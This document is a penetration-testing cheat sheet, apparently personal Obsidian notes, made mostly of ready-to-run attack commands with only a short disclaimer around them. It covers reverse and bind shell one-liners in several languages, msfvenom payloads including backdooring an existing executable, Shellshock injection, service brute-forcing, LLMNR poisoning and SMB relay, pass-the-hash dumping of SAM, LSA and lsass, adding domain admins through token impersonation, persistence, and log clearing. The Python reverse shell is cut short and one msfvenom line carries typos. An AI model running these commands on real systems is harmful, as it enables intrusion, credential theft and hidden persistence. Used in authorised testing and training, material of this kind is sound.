# DISCLAIMER
---
==The following content is provided for educational and informational purposes only.==  

==The author does not condone or encourage any illegal activities, including the use of malware or the exploitation of computer systems, networks, or websites without proper legal authorization.==

@ [kyc](https://github.com/iikyc)

```
										   _   _               _   _ 
										  (_) | |             | | | |
			  _ __   __      __  _ __      _  | |_      __ _  | | | |
			 | '_ \  \ \ /\ / / | '_ \    | | | __|    / _` | | | | |
			 | |_) |  \ V  V /  | | | |   | | | |_    | (_| | | | | |
			 | .__/    \_/\_/   |_| |_|   |_|  \__|    \__,_| |_| |_|
			 | |                                                     
			 |_|
```

`Made w/Obsidian`

<div style="page-break-after: always;"></div>

# Reverse shells
---

## Useful links

1. [Pentestmonkey reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
2. [Revshells](https://www.revshells.com/)
3. [HackTricks shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)

## Bash

```
bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1
```

## Python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ADDRESS>",<PORT>));
```

## PHP

```
php -r '$sock=fsockopen("<IP_ADDRESS>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Netcat

```
nc -e /bin/sh <IP_ADDRESS> <PORT>
```

<div style="page-break-after: always;"></div>
## Powershell

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

# Bind shells

## Bash

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <PORT> >/tmp/f
```

```
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
# Upgrading shells

-> TIP: Check what shells are available by running `cat /etc/shells`

-> After upgrading a shell, the $PATH environment variable might break. To set it up again, run:

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin
```

-> After upgrading, run these to make the shell a bit more interactive:-
	1.`export SHELL=<SHELL_NAME>`
	2. `export TERM=xterm`

- Using Bash

```
/bin/bash -i
```

or

```
bash -i
```

- Using sh

```
/bin/sh -i
```

- Using Python

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

- Using Python3

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- Using Perl

```
perl -e 'exec "/bin/bash";'
```

- Using Ruby

```
ruby: exec "/bin/bash"
```

<div style="page-break-after: always;"></div>

# Nmap
---

| Switch | Function |
| :-----------: | :-----------: |
| -p | Specify port |
| -sV | Version scanning |
| -sC | Default scripts |
| -O | OS Detection |
| -A | Aggressive scan, uses -O, -sV, -sC, --traceroute |
| -T<0-5> | Timing, default is -T3 |
| -oA, -oG, -oN | Output all, greppable, normal |
| -sU | UDP Scan |
| -Pn | Skip host discovery |
| -v, -vv | Set verbosity |
| -d , -dd | Debug |
| --reason | Display reasoning |

## Looking for an Nmap script?

```
ls -la /usr/share/nmap/scripts/ | grep *<KEYWORD>*
```

## Basic Nmap scan

```
nmap -sV -sC -vv <IP_ADDRESS>
```

## Comprehensive Nmap scan

```
nmap -sV -sC -vv -p- <IP_ADDRESS>
```

## Nmap says it's down?

```
nmap -Pn..
```

## What to note from Nmap scans
- Open ports
- Running services
- Service versions -> Look for exploits online or using searchsploit
- FTP Anonymous login allowed?
- Is RDP running?
- Non-standard ports for services such as ssh, http etc..

<div style="page-break-after: always;"></div>

# Web testing
---
## Useful links

1. [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
2. [HackTricks URL Format Bypass](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass)
3. [HackTricks PHP Tricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp)
4. [HackTricks Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
5. [HackTricks CSRF](https://book.hacktricks.xyz/pentesting-web/csrf-cross-site-request-forgery)

## Initial steps (not in order)
1. Check for common dirs (robots.txt, wp-login.php etc..)
2. Fuzz dirs with ffuf & dirb -> `ffuf -w <WORDLIST_PATH>:FUZZ -u <URL>/FUZZ`
3. Any page that takes URL parameters?
4. What technologies are running? (Use Wappalyzer extension, check response headers etc..)
5. Check page sources
6. Any JS scripts?
7. Anything in local storage or any cookies? (Decode if possible -> Possible session hijack) 
8. Move on to SQLi vectors, mess around with requests using Burpsuite/OWASP ZAP

## CGI/Shellshock

- Check if vulnerable to shellshock w/Nmap

```
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/<NAME>.cgi" <IP>
```

- Manual exploitation
	1. Capture a request to the vulnerable URI
	2. Delete default User-Agent value
	3. Replace User-Agent with `() { :; }; echo; echo; /bin/bash -c '<COMMAND>'`
	4. Send the request

- Metasploit exploitation
	- Remember to set the TARGETURI!

```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

## WordPress

## wpscan

- Get general information w/wpscan

```
wpscan --url <URL>
```

- Enumerate users w/wpscan

```
wpscan --url <URL> --enumerate u
```

- Brute force users w/wpscan

```
wpscan --url <URL> --usernames <USERNAMES_FILE> --passwords <WORDLIST>
```

<div style="page-break-after: always;"></div>

# FTP
---

## Useful links

1. [HackTricks FTP](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp)

## FTP Anonymous login

- Username: anonymous
- Password: ""

- To check with Nmap:-

```
nmap --script ftp-anon <IP>
```

<div style="page-break-after: always;"></div>
- FTP Commands

| Command | Function |
| :----: | :----: |
| status | Show current status; transfer mode, connection status, time-out value etc.. |
| verbose | Switch verbose mode on/off. Displays additional information during transfers and command execution |
| get | Download a file |
| put | Upload a file |

- vsFTPd config file is at `/etc/vsftpd.conf`

- Dangerous settings

| Setting | Function |
| :----: | :----: |
| anonymous_enable=YES | Allows anonymous login |
| anon_upload_enable=YES | Allows anonymous file uploads |
| anon_mkdir_write_enable=YES | Allows anon users to create directories |
| no_anon_password=YES | anonymous login wo/password |

# SMB
---

## Useful links

1. [HackTricks SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)

- Try user "guest" and no password

- SAMBA config file is at `/etc/samba/smb.conf`

- Dangerous configuration settings

| Setting | Function |
| :----: | :----: |
| browseable = yes | Allow listing available shares in the current share |
| read only = no| Forbid the creation and modification of files |
| writable = yes| Allow users to create and modify files |
| guest ok = yes| Allow connecting to the service without using a password |
| enable privileges = yes| Honor privileges assigned to specific SID |
| create mask = 0777| What permissions must be assigned to the newly created files |
| directory mask = 0777| What permissions must be assigned to the newly created directories |
| logon script = script.sh| What script needs to be executed on the user's login |
| magic script = script.sh| Which script should be executed when the script gets closed |
| magic output = script.out| Where the output of the magic script needs to be stored |

- Enumeration with rpcclient

`rpcclient -U "" <IP>`

| Command | Function |
| :----: | :----: |
|srvinfo | Get server information |
| enumdomains | Enumerate all domains |
| querydominfo | Domain, server, user info of deployed domains |
| netshareenumall | Enumerate all shares |
| `netsharegetinfo <share>` | Get info about specific share |
| enumdomusers | Enumerate all domain users |
| `queryuser <RID>` | Get info about specific user |
| `querygroup <ID>` | Get info about specific group |

- Brute force RIDs to find users w/rpcclient

```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

- Find users with impacket/samrdump

```
impacket-samrdump <IP>
```

## Get OS version

```
srvinfo
```

## Nmap for SMB enumeration

Find version

```
nmap -p445 --script smb-protocols <IP>
```

- Security mode

```
nmap -p445 --script smb-security-mode <IP>
```

- Enumerate sessions

```
nmap -p445 --script smb-enum-sessions <IP>
```

- Enumerate shares

```
nmap -p445 --script smb-enum-shares <IP>
```

- Enumerate users

```
nmap -p445 --script smb-enum-users <IP>
```

- Enumerate domains

```
nmap -p445 --script smb-enum-domains <IP>
```

- Enumerate groups

```
nmap -p445 --script smb-enum-groups <IP>
```

- Enumerate services

```
nmap -p445 --script smb-enum-services <IP>
```

- Enumerate shares and list files/dirs

```
nmap -p445 --script smb-enum-shares,smb-ls <IP>
```

- Run these ^ with `--script-args smbusername=<USERNAME>,smbpassword=<PASSWORD>` if you have valid credentials

- Using enum4linux to enumerate users (authenticated)

```
enum4linux -u <USERNAME> -p <PASSWORD> -U <IP>
```

- Get shell with psexec.py
	- Check Metasploit's psexec module as well

```
python3 psexec.py <USERNAME>@<IP>
```

## smbmap

- Basic enumeration

```
smbmap -H <IP>
```

- Enumeration with username & password

```
smbmap -u <USERNAME> -p <PASSWORD> -H <IP>
```

- Upload w/smbmap

```
smbmap -H <IP> -u <USER> -p "<PASSWORD>" --upload "<DIR/FILE TO UPLOAD>" "<SHARE>\<FILENAME>"
```

- Download w/smbmap

```
smbmap -H <IP> -u <USER> -p "<PASSWORD>" --download "<SHARE>\<FILE>"
```
## smbclient

- List shares

```
smbclient -L \\\\<HOST>
```

- Connect

```
smbclient \\\\<HOST>\\<SHARE>
```

<div style="page-break-after: always;"></div>
# NFS

- Similar functionality to SMB/Samba, but only works for Linux/Unix systems

- Shared filesystems can be found at `/etc/exports`

- Shared filesystems options

| Option | Function |
| :----: | :----: |
| rw | Read & write permissions |
| ro | Read only permissions |
| sync | Synchronous data transfer (slower) |
| async | Asynchronous data transfer (faster) |
| secure | Ports above 1024 are not used |
| insecure | Ports above 1024 will be used |
| no_subtree_check | Disables checking of subdirectory trees |
| root_squash | Files created by root keep UID/GID 0 |

- Dangerous settings
	- rw
	- insecure
	- nohide
	- no_root_squash

- Example: Share the `/mnt/nfs` folder to the subnet `10.129.14.0/24`

```
# echo '/mnt/nfs 10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports

# systemctl restart nfs-kernel-server

# exportfs
```

- Show available NFS shares on target

```
showmount -e <IP>
```

- Mount an NFS share

```
mkdir <LOCAL_DIR>
```

```
sudo mount -t nfs <IP>:/<SHARE_PATH> ./<LOCAL_DIR> -o nolock
```

```
cd <LOCAL_DIR>
```

```
tree .
```

- Unmount share

```
cd ..
```

```
sudo umount <LOCAL_DIR>
```

- Footprinting with `nmap`

```
nmap --script nfs* -sV -p 111,2049 <IP>
```

# DNS

- DNS Servers

| Server type | Function |
| :----: | :----: |
| DNS Root Server | Responsible for TLDs. Requested if the NS doesn't respond. |
| Authoritative nameserver | Hold authority over a particular zone, only answering queries from there. |
| Non-authoritative nameserver | Holds info about a particular DNS zone by recursive DNS querying |
| Caching DNS server | Holds DNS info for a time period determined by the authoritative nameserver |
| Forwarding server | Forward DNS queries to other servers |
| Resolver | Perform local name resolution on a machine or router |

- DNS Records

| DNS Record | Description |
| :----: | :----: |
| A | IPv4 address |
| AAAA | IPv6 address |
| MX | Mail servers |
| NS | Nameservers |
| TXT | SPF, DMARC entries + extra information |
| CNAME | Alias |
| PTR | Reverse lookup | 
| SOA | DNS Zone & email address of administrative contact |

- Linux Bind9 DNS server configuration file is at `/etc/bind/named.conf.local`


# SSH
---

- Check authentication method for a user with Nmap

```
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <IP>
```

- Brute force using Metasploit

```
use auxiliary/scanner/ssh/ssh_login
```

- Brute force using Nmap

```
nmap -p 22 --script ssh-brute --script-args userdb=<USERNAMES>,passdb=<PASSWORDS_FILE> <IP>
```

<div style="page-break-after: always;"></div>

# Microsoft IIS
---

- General enumeration with Nmap

```
nmap -sV -p 80 --script http-enum <IP>
```

- Get headers with Nmap

```
nmap -sV -p 80 --script http-headers <IP>
```

- Get methods with Nmap

```
nmap -sV -p 80 --script http-methods <IP>
```

<div style="page-break-after: always;"></div>

# HTTP
---

- Brute force directories with Metasploit

```
use auxiliary/scanner/http/brute_dirs
```

- Check robots.txt with Metasploit

```
use auxiliary/scanner/http/robots_txt
```

<div style="page-break-after: always;"></div>

# MySQL
---

- Connect remotely

```
mysql -h <IP> -u <USER>
```

## Commands

- Show databases: `show databases;`
- Use a database: `use <DATABASE>;`
- Load local file: `select load_file("/etc/shadow");`

- Check writable directories through MySQL with Metasploit

```
use auxiliary/scanner/mysql/mysql_writeable_dirs
```

```
set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
```

- Hashdump through MySQL with Metasploit

```
use auxiliary/scanner/mysql/mysql_hashdump
```

- Check accounts with no password with Nmap

```
nmap -sV -p 3306 --script=mysql-empty-password <IP>
```

- Get MySQL information with Nmap

```
nmap -sV -p 3306 --script=mysql-info <IP>
```

- Get MySQL users with Nmap (authenticated)

```
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USERNAME>',mysqlpass='<PASSWORD>'"
```

- Brute force users with Metasploit

```
use auxiliary/scanner/mysql/mysql_login
```

```
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```
set stop_on_success true
```

```
set USERNAME <USERNAME>
```

<div style="page-break-after: always;"></div>

# MSSQL
---

- General enumeration with Nmap

```
nmap -p 1433 --script ms-sql-info <IP>
```

- Get NTLM info with Nmap

```
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <IP>
```

- Brute force with Nmap

```
nmap -p 1433 --script ms-sql-brute --script-args userdb=<USERS_LIST>,passdb=<PASSWORD_LIST> <IP>
```

- Check for users with no password

```
nmap -p 1433 --script ms-sql-empty-password <IP>
```

- Dump hashes with Nmap

```
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<USERNAME>,mssql.password=<PASSWORD> <IP>
```

- Code execution with Nmap

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USERNAME>,mssql.password=<PASSWORD>,ms-sql-xp-cmdshell.cmd="<COMMAND>" <IP>
```

- Brute force with Metasploit

```
use auxiliary/scanner/mssql/mssql_login
```

- General enumeration

```
use auxiliary/admin/mssql/mssql_enum
```

- Code execution

```
use auxiliary/admin/mssql/mssql_exec
```

```
set CMD <COMMAND>
```

<div style="page-break-after: always;"></div>

# WebDAV
---

- To ensure WebDAV is running

```
nmap -sV -p 80 --script=http-enum <IP>
```

- Brute force the login with Hydra
	- Replace "/webdav" with the correct directory

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt <IP> http-get /webdav/
```

- Test file uploads and execution
	- Test with random/invalid creds too

```
davtest -auth <USERNAME>:<PASSWORD> -url <URL>/<WEBDAV_DIR>
```

- Interact with WebDAV using cadaver

```
cadaver <URL>/<WEBDAV_DIR>
```

- ASP Webshell upload with Metasploit (authenticated)

```
use exploit/windows/iis/iis_webdav_upload_asp
```

```
set PATH <WEBDAV_PATH>/shell.asp
```

<div style="page-break-after: always;"></div>

# RDP
---

- RDP Can run on any port, so to check whether a port is running RDP
	- Remember to set RPORT!

```
use auxiliary/scanner/rdp/rdp_scanner
```

- Brute force with Hydra

```
hydra -L <USERNAMES_LIST> -P <PASSWORD_LIST> <IP> rdp -s <PORT>
```

- Connect via xfreerdp

```
xfreerdp /u:<USER> /p:<PASSWORD> /v:<IP>:<PORT>
```

<div style="page-break-after: always;"></div>

# WinRM
---

- Might run on port 5985 or 5986(HTTPS) (won't show up unless all ports are scanned)

- Brute force WinRM with crackmapexec

```
crackmapexec winrm <IP> -u <USERNAME> -p <PASSWORD_LIST>
```

- Execute commands with crackmapexec

```
crackmapexec winrm <IP> -u <USERNAME> -p <PASSWORD> -x "<COMMAND>"
```

- Get Powershell with evil-winrm

```
evil-winrm.rb -u <USERNAME> -p "<PASSWORD>" -i <IP>
```

- Get shell with Metasploit
	- Set RPORT if necessary!

```
use exploit/windows/winrm/winrm_script_exec
```

<div style="page-break-after: always;"></div>

# Metasploit
---

- Upgrade a session to meterpreter

```
CTRL + Z
sessions -u <SESSION_NUMBER>
```

Or

```
CTRL + Z
use post/multi/manage/shell_to_meterpreter
```

- Generate ASP webshell
	- Try outputting to .aspx as well

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f asp > shell.asp
```

```
> service postgresql start && msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <ATTACKER_IP>
> set LPORT <ATTACKER_PORT>
> run
```

- Encode payload (Windows x86, exe, shikata_ga_nai encoded example)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe > <OUTPUT_FILE>
```

You can add iterations to the encoder with `-i <NUMBER_OF_ITERATIONS>`

- Inject payload into an exe
	- Add `-k` to keep the executable's original functionality along with the injected payload, this may or may not work

```
msfvenom -p windows/meterpreter/reverse_tpc LHOST=<IP> LPORT=<IP> -e x86/shikata_ga_nai -i 10 -f exe -x <PATH_TO_EXECUTABLE> > <OUTPUT_FILE>
```

- Exploit suggester (post-exploitation w/session)

```
use post/multi/recon/local_exploit_suggester
```

- Get shell after getting user hash

```
use psexec
```

`set SMBPass to LM:NTLM hash`

- Dump Linux hashes then crack them all through Metasploit

	- Get a meterpreter shell on the Linux target
		- msfconsole must have been started with `service postgresql start && msfconsole`
	- Background it with `CTRL + Z`
	- `use post/linux/gather/hashdump`
		- `set SESSION <SESSION_NUMBER>`
	- `use auxiliary/analyze/crack_linux`
		- Set the correct hashing algorithm

- Nmap scan from Metasploit

```
db_nmap <REST OF NMAP AS USUAL>
```

or

`search portscan` and pick a module

- Import Nmap scan results to Metasploit

```
nmap ... -oX <FILENAME>
```

```
service postgresql start && msfconsole
```

```
db_import <FILENAME> 
```

You can then view hosts: `hosts`

and services running on each host: `services`

and vulnerabilities: `vulns`

- Scan internal target from external foothold

1. From the compromised external-facing host, drop into a shell `shell`
2. Check interfaces with `ifconfig`, one should point to another network
3. Exit the shell, and run from the Meterpreter shell `run autoroute -s <IP_FROM_INTERFACE.0/CIDR>`
	1. The IP we enter here will be the TARGET IP in the other network
4. Now, you have access to scan and exploit other targets, just background `background` the session and use any modules.

- Get logged on/recent users (Windows)

```
use post/windows/gather/enum_logged_on_users
```

- Check if machine is a VM (Windows)

```
use post/windows/gather/checkvm
```

- List installed applications on machine (Windows)

```
use post/windows/gather/enum_applications
```

- Get excluded antivirus paths (Windows)

```
use post/windows/gather/enum_av_excluded
```

- List all computers on victim's LAN (Windows)

```
use post/windows/gather/enum_computers
```

- List installed patches (Windows)

```
use post/windows/gather/enum_patches
```

- Clearing logs from Meterpreter shell

```
clearev
```

<div style="page-break-after: always;"></div>

# Netcat
---

- Enable verbose mode

```
nc -v <IP>...
```

- Transferring files

```
Recipient: nc -lvnp <PORT> > <OUTPUT_FILE>
```

```
Sender: nc -nv <RECIPIENT_IP> < <FILE_TO_SEND>
```

- Bind shell

```
Target: nc -lvnp <PORT> -e <cmd.exe/powershell.exe etc..>
```

```
Attacker: nc -nv <IP> <PORT>
```

<div style="page-break-after: always;"></div>

# Brute-forcing services
---

## Useful links

1. [HackTricks Brute Force Cheatsheet](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)

- Burpsuite
- OWASP ZAP

## Hydra

- Example: `hydra -l <USERNAME> -P <PASSWORD_LIST> ssh://<IP_ADDRESS>`
- Example: `hydra -l <USERNAME> -P <PASSWORD_LIST> <IP_ADDRESS> ssh -s <PORT>`
- Example: `hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET_IP> http-post-form "/Account/login.aspx:<Paste request body from network>`-> view raw, replace fields with ^USER^ and ^PASS^>:Login failed"
- HTTP-GET: `hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET_IP> http-get "<PATH>"`

<div style="page-break-after: always;"></div>

# Active Directory
---

## Useful links

1. [HackTricks Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
2. [Orange Cyberdefense AD Mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)

## Using Responder for LLMNR poisoning

- This is very noisy
- Might take a lot of time to intercept traffic

`sudo responder -I <INTERFACE> -dwPv` -> `-v` to display hashes that are already in the potfile

## Using Inveigh for LLMNR poisoning

[Inveigh Github](https://github.com/Kevin-Robertson/Inveigh)

`Inveigh can be used off of a Windows machine as a replacement for Responder`

```
.\Inveigh.exe
```

- Press "Esc" to open console
- Type "HELP" to see available actions

### Crack captured hashes from Responder with Hashcat
`hashcat -m 5600 <HASH_FILE> <PASSWORD_FILE> --force` `-m 5600` -> is for NTLMv2 hashes, check formats with --help

## SMB Relay attack

### Conditions

1. SMB Signing has to be DISABLED/NOT ENFORCED
2. Relayed hash must be admin for any real value

### Check if a host has SMB signing disabled with Nmap

```
nmap --script=smb2-security-mode.nse -p 445 <IP/CIDR>
```

### Execution

1. Turn off SMB & HTTP in /etc/responder/Responder.conf
2. `sudo ntlmrelayx.py -tf targets.txt -smb2support` -> ! try `impacket-ntlmrelayx` if not found
	1. add `-i` for an interactive shell, then `nc 127.0.0.1 11000`
	2. add `-c "<COMMAND>"` for command execution

## Gaining a shell

### Using Metasploit

- Easy to be detected in real world pentests

```
use exploit/windows/smb/psexec
```

OR

```
psexec.py <USER>@<IP_ADDRESS> -hashes <LM:NT>
```

### Using psexec.py

```
psexec.py <DOMAIN>/<USER>:'<PASSWORD>'@<IP_ADDRESS>
```

####
Alternatives to psexec.py
1. wmiexec.py
2. smbexec.py

Which one works depends on target machine

## IPv6 DNS Takeover via mitm6
1. `ntlmrelayx.py -6 -t ldaps://<DC_IP_ADDRESS> -wh fakewpad.<DOMAIN> -l lootme`
2. `sudo python3 mitm6.py -d <DOMAIN>`
3. Check lootme/

### Note
1. Do not run this for longer than 5-10 minutes, can mess with the network or boot yourself off
2. If an admin logs in, a new user will be created on the domain

## Active Directory enumeration (post-compromise)

### Using ldapdomaindump

`sudo ldapdomaindump ldaps://<DC_IP_ADDRESS> -u '<DOMAIN>\<USERNAME>' -p <PASSWORD>`

### Using Bloodhound

1. `sudo neo4j console`
2. Login to neo4j
3. `sudo bloodhound`
4. Login to Bloodhound using neo4j creds
5. `sudo bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWORD> -ns <DC_IP_ADDRESS> -c all`
6. Load the dumped files into Bloodhound

## Pass the password

1. `crackmapexec smb <IP/CIDR> -u <USER> -d <DOMAIN> -p <PASSWORD>`

## Pass the hash

1. `crackmapexec smb <IP/CIDR> -u <USER> -H <HASH> --local-auth`

### Dump SAM with pass the hash & crackmapexec

1. `crackmapexec smb <IP/CIDR> -u <USER> -H <HASH> --local-auth --sam`
2. This will dump all user's creds provided you authenticate to the machine with the passed hash

### Dump LSA with pass the hash & crackmapexec

1. `crackmapexec smb <IP/CIDR> -u <USER> -H <HASH> --local-auth --lsa`

### Dump lsass with lsassy

1. `crackmapexec smb <IP/CIDR> -u <USER> -H <HASH> --local-auth -M lsassy`

### Access crackmapexec database

1. `cmedb`

### Kerberoasting with impacket

After cracking an account's hash, use this to request a TGT + TGS from the KDC to dump the service account hash

1. `sudo impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 192.168.57.12 -request`

### Token impersonation

#### Two types

1. Delegate: Created for logging into a machine or using Remote Desktop
2. Impersonate: "Non-interactive" such as attaching a network drive or a domain logon script

-> Can be done from any meterpreter shell as long as "getprivs" has Impersonate

1. `msfconsole`
2. `use exploit/windows/smb/psexec`
3. Set RHOSTS, SMBDomain, SMBPass, SMBUser
4. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
5. `meterpreter> load incognito`
6. List tokens with `list_tokens -u`
7. Impersonate a user with `impersonate_token <DOMAIN>\\<USERNAME>`
8. Add a new user (if you impersonated an admin) `net user /add <USERNAME> <PASSWORD> /domain`
9. Add the new user to domain admins `net group "Domain Admins" <USERNAME> /ADD /DOMAIN`

### dump ntdt.dit with secretsdump

`secretsdump.py <DOMAIN>/<USER>:"<PASSWORD>"@<DC_IP_ADDRESS> -just-dc-ntlm`

### Golden ticket attacks

- Compromise the "krbtgt" account
- Completely pwn the AD Domain
- You need the
	- NTLM hash of krbtgt
	- Domain SID

### Enumerate accounts through Kerberos Pre-Authentication w/kerbrute

```
./kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USERNAMES_FILE>
```

### AS-REP Roasting

```
impacket-GetNPUsers -no-pass -usersfile <USERNAMES_FILE> -format <john/hashcat> -dc-ip <DC_IP> <DOMAIN>/
```


<div style="page-break-after: always;"></div>

# Windows persistence
---

## Metasploit persistence scripts

- Dangerous to run, leaves ports exposed
- Run `persistence -h`
- `exploit/windows/local/persistence`
- `exploit/windows/local/registry_persistence`

## Use scheduled tasks

- `scheduleme`
- `schataskabuse`

## Or just add a user..

```
 net user <USERNAME> <PASSWORD> /add
```

<div style="page-break-after: always;"></div>

# Windows misc
---

- Get file from a server (eq to "wget" on Linux)

```
certutil -urlcache -f http://<IP>:<PORT>/<FILENAME> <OUTPUT_FILENAME>
```

## Hosts file

-> C:\Windows\System32\drivers\etc\hosts

## Get shell w/evil-winrm

```
evil-winrm -u '<USERNAME>' -p '<PASSWORD>' -i <IP>
```

- Get a shell with psexec.py from Linux attack box (authenticated)

```
psexec.py <USERNAME>@<TARGET_IP> cmd.exe
```

## Find stored WiFi passwords

```
netsh wlan export profile key=clear
```

- Check the `<keyMaterial>` in .xml file

<div style="page-break-after: always;"></div>
- Find passwords leftover from unattended installation
	- `C:\Windows\Panther\Unattend.xml`
	- `C:\Windows\Panther\Autounattend.xml`
	- Passwords might be encoded in base64

- Get privileges

```
whoami /priv
```

- Get logged on users

```
query user
```

- Display users

```
net users
```

- Get more information about a user

```
net user <USERNAME>
```

- Display group details

```
net localgroup <GROUP_NAME>
```

- Display routing table

```
route print
```

- Display ARP table

```
arp -a
```

- List started services

```
net start
```

or

```
wmic service list brief
```

or

```
tasklist /SVC
```

- Display running services + ports + PIDs + states

```
netstat -ano
```

- List scheduled tasks

```
schtasks /query /fo LIST
```

<div style="page-break-after: always;"></div>

# Linux misc
---

- CPU info

```
lscpu
```

- Display filesystems

```
df -h
```

- Display storage devices

```
lsblk
```

- List installed packages

```
dpkg -l
```


## /etc/shadow

- Get hashing algorithm from /etc/shadow

| Value | Hashing algorithm | Cracking difficulty |
| :----: | :----: | :----: |
| $1 | MD5 | Ez |
| $2 | Blowfish | Ez |
| $5 | SHA-256 | Harder |
| $6 | SHA-512 | Harder |

## Find

|What we can do|Syntax|Real example of syntax|
|:---:|:---:|:---:|
|Find files based on filename|find [directory path] -type f -name [filename]|find /home/Andy -type f -name sales.txt|
|Find Directory based on directory name|find [directory path] -type d -name [filename]|find /home/Andy -type d -name pictures|
|Find files based on size|find [directory path] -type f -size [size]|find /home/Andy -type f -size 10c<br><br>(c for bytes,<br><br>k for kilobytes<br><br>M megabytes<br><br>G for gigabytes<br><br>type:'man find' for full information on the  options)|
|Find files based on username|find [directory path] -type f -user [username]|find /etc/server -type f -user john|
|Find files based on group name|find [directory path] -type f -group [group name]|find /etc/server -type f -group teamstar|
|Find files modified after a specific date|find [directory path] -type f -newermt '[date and time]'|find / -type f -newermt '6/30/2020 0:00:00'<br><br>(all dates/times after 6/30/2020 0:00:00 will be considered a condition to look for)|
|Find files based on date modified|find [directory path] -type f -newermt [start date range] ! -newermt [end date range]|find / -type f -newermt 2013-09-12 ! -newermt 2013-09-14<br><br>(all dates before 2013-09-12 will be excluded; all dates after 2013-09-14 will be excluded, therefore this only leaves 2013-09-13 as the date to look for.)|
|Find files based on date accessed|find [directory path] -type f -newerat [start date range] ! -newerat [end date range]|find / -type f -newerat 2017-09-12 ! -newerat 2017-09-14<br><br>(all dates before 2017-09-12 will be excluded; all dates after 2017-09-14 will be excluded, therefore this only leaves 2017-09-13 as the date to look for.)|
|Find files with a specific keyword|grep -iRl [directory path/keyword]|grep -iRl '/folderA/flag'|

<div style="page-break-after: always;"></div>

# Privilege escalation
---

## Useful links

1. [HackTricks Windows Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
2. [HackTricks Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

## Linux privesc

- Check for hidden files
- sudo -l
- cat /etc/crontab
- getcap -r / 2>/dev/null
- find / -perm -04000 2>/dev/null
- Use LINPEAS
- Use pspy
- Check /opt
- Check config files for credentials

## Windows privesc

### 1 (From simple reverse shell)

- whoami /priv
- (SeImpersonatePrivilege        Impersonate a client after authentication Enabled) ?
- Use PrintSpoofer.exe
- PrintSpoofer.exe -i -c cmd

<div style="page-break-after: always;"></div>

# Pivoting
---

## Using proxychains

1. Check interfaces `ip a show`
2. `cat /etc/proxychains`
	1. "socks4 127.0.0.1 'PORT'"
3. `ssh -f -N -D <PORT> -i <IDENTITY> <USER>@<IP_ADDRESS_NETWORK_1_MACHINE>`
4. `proxychains <COMMAD>`

## Using Metasploit

https://www.youtube.com/watch?v=r7yuU7nvjSc
## Using sshuttle

```
sshuttle -r <USER>@<MACHINE_NETWORK_1_IP> <IP+CIDR> -ssh -cmd "ssh -i <IDENTITY>"
```

Then just run commands in any terminal and you will have access to network 2.

<div style="page-break-after: always;"></div>

# Port forwarding
---

Found open ports and want to access them after pivoting through Metasploit?
